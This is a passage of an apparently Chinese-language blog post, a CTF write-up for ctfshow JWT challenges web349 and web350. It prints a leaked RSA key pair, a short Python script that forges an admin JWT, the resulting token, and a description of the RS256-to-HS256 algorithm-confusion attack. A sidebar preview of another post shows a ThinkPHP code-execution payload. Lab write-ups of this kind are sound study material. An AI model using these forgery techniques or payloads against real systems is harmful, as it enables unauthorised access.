获取公钥</span></span><br><span class="line">  <span class="comment">// 使用公钥验证 JWT 的签名</span></span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果 JWT 验证成功</span></span><br><span class="line">    <span class="keyword">if</span> (decoded.<span class="property">user</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果用户是 &#x27;admin&#x27;，返回 flag</span></span><br><span class="line">      res.<span class="title function_">end</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果用户不是 &#x27;admin&#x27;，返回提示信息</span></span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>这段js代码关键部分在public.key和private.key，我们可以下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb</span><br><span class="line">+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX</span><br><span class="line">YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA</span><br><span class="line">bG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb</span><br><span class="line">eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8</span><br><span class="line">IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK</span><br><span class="line">frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX</span><br><span class="line">h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM</span><br><span class="line">cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi</span><br><span class="line">ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv</span><br><span class="line">ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA</span><br><span class="line">+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ</span><br><span class="line">V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW</span><br><span class="line">zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV</span><br><span class="line">x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>这里要安装node。省略安装步骤</p>
+<p>运行如下代码得先安装两个库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install jwt</span><br><span class="line">pip install pyjwt</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://aaa.py">aaa.py</a></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">public = open(&#x27;private.key&#x27;<span class="punctuation">,</span> &#x27;r&#x27;).read()</span><br><span class="line">payload=<span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">print(jwt.encode(payload<span class="punctuation">,</span> key=public<span class="punctuation">,</span> algorithm=&#x27;RS256&#x27;))</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://xn--aaa-y28d4do3tbvbt6fea07j83p6o0a1a106ixo9cka999vytlll1eoo5a4gvca.py">然后把公钥和私钥丢在当前目录下然后运行aaa.py</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</span><br></pre></td></tr></table></figure>
+<p>再或者去其他网站进行公私钥加解密</p>
+<p>记得post当中需要/</p>
+<h1>web350</h1>
+<p>给了源码，当中有用的是公钥</p>
+<p>根据公钥，修改算法从 非对称算法（比如RS256） 到 对称密钥算法（HS256）<br>
+双方都使用公钥验签，顺利篡改数据<br>
+当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密<br>
+实现验签通过</p>
+<p>有公钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----CTFSHOW 36D BOY -----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfdIGdsPuxSGPuosgarjZ7zO4t</span><br><span class="line">HHmQ7+6WUiKBA0ykcXe6aK9zcVVKCcEwyMbENgTF4Et8RjZ3NKs1Co74Q+4gII5G</span><br><span class="line">IgQFSS0PzTOKmoTY1fnA6+jqBquV4RnU283kgdaKmkaSRdiwsW2EaagMgZdG6WJk</span><br><span class="line">65RmH98bgnIAGW5nawIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>然后在C:\Users\ssz\Desktop\study\ctfshow\web\JWT\JWT\public下添加公钥文件，然后运行aaa.js文件即可</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">向每个梦想加速</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/14/JWT-1/">http://example.com/2025/04/14/JWT-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">向每个梦想加速</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JWT/">JWT</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/14/ThinkPHP/" title="ThinkPHP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">ThinkPHP</div></div><div class="info-2"><div class="info-item-1">前置知识 ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。PHP 框架像是一个工具箱，提供了开发 web 应用所需的所有基本工具，帮助开发者更快速、更安全地完成开发任务。 1http://serverName/index.php/模块/控制器/操作 web569 /index.php/admin/login/ctfshowlogin web570 有一个闭包函数 123&#x27;ctfshow/:f/:a&#x27; =&gt;function($f,$a)&#123;    call_user_func($f, $a);&#125; 123/index.php/ctfshow/assert/assert($_POST[&#x27;zmr&#x27;])zmr=system(&#x27;ls&#x27;); web571 没有直接给后门什么的 但是有一个  没有定义位置，这是一个thinkphp自带的函数，我们去前置知识看看   意思就是他可以解析我们的代码 1?n=&lt;?php system(&#x27;cat...</div></div></div></a><a class="pagination-related" href="/2025/04/14/PHP-GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/" title="PHP_GC垃圾回收机制"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PHP_GC垃圾回收机制</div></div><div class="info-2"><div class="info-item-1">首先给出参考资料，各位可以直接看参考资料。我下面写的都基于参考加入我的理解而成的。 https://xz.aliyun.com/news/11289 PHP中的GC垃圾回收机制(Garbage collection) 在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向 时，它就会被变成垃圾，被GC机制自动回收掉，即当一个对象没有被引用时，就会被GC机制回收，在回收的过程中，它会自动触发_destruct方法，而这也就是我们绕过抛出异常的关键点。 引用计数和回收周期是为了优化内存，然而这种机制恰好造成了这里的&quot;漏洞&quot;。 我们通常使用的点是引用计数： 引用计数的初始默认值为0，每次调用一个变量，引用计数加一，每次unset(删除)一个变量，引用计数减一。 我们调用进程的时候，引用计数会增加(随着变量的增加而增加)；当进程结束时，引用计数会减到默认值0(随着变量的释放而减少)。使用__destuct魔法方法时进程会持续运行或抛出异常(throw new...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/16/JWT/" title="JWT"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-16</div><div class="info-item-2">JWT</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">向每个梦想加速</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://user.qzone.qq.com/2325525993"><i class="fas fa-envelope"></i><span>qq空间</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">qq2325525993</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">JWT	JSON Web Token</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B7%A8%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">一、跨域认证的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81JWT-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">二、JWT 的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81JWT-%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.</span> <span class="toc-text">三、JWT 的数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Header"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 Header</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Payload"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Signature"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 Signature</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-Base64URL"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.4 Base64URL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81JWT-%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">四、JWT 的使用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81JWT-%E7%9A%84%E5%87%A0%E4%B8%AA%E7%89%B9%E7%82%B9"><span class="toc-number">1.5.</span> <span class="toc-text">五、JWT 的几个特点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Web345</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web346</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web347</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web348</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web349</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web350</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/ThinkPHP/" title="ThinkPHP">ThinkPHP</a><time datetime="2025-04-14T08:53:45.000Z" title="发表于 2025-04-14 16:53:45">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/JWT-1/" title="JWT">JWT</a><time datetime="2025-04-14T08:51:00.000Z" title="发表于 2025-04-14 16:51:00">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/PHP-GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/" title="PHP_GC垃圾回收机制">PHP_GC垃圾回收机制</a><time datetime="2025-04-14T08:50:14.000Z" title="发表于 2025-04-14 16:50:14">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP魔术方法">PHP魔术方法</a><time datetime="2025-04-14T08:49:31.000Z" title="发表于 2025-04-14 16:49:31">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" title="州弟学安全靶场复现">州弟学安全靶场复现</a><time datetime="2025-04-14T08:48:04.000Z" title="发表于 2025-04-14 16:48:04">2025-04-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/beijing.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By 向每个梦想加速</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="MING,LOVE,ME" data-fontsize="10px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
